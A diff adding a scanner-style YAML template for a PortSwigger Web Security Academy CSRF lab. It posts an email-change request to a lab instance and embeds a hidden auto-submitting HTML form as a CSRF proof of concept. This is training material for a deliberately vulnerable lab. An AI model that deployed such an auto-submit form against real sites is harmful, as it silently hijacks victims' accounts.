@@ -1,0 +1,29 @@
+id: csrf-no-defenses
+info:
+  name: CSRF Vulnerability - Change Email (No Defenses)
+  author: YourName
+  severity: High
+  description: This template simulates a CSRF attack to change the email address.
+  reference:
+    - https://portswigger.net/web-security/csrf/lab-no-defenses
+
+http:
+  - method: POST
+    path:
+      - "https://0aab00c4038b6c128068a3db001700d1.web-security-academy.net/my-account/change-email"
+    body: |
+      email=anything%40web-security-academy.net
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: word
+        words:
+          - "Email address updated"
+        part: body
+    script: |
+      <form method="POST" action="https://0aab00c4038b6c128068a3db001700d1.web-security-academy.net/my-account/change-email">
+        <input type="hidden" name="email" value="anything%40web-security-academy.net">
+      </form>
+      <script>
+        document.forms[0].submit();
+      </script>
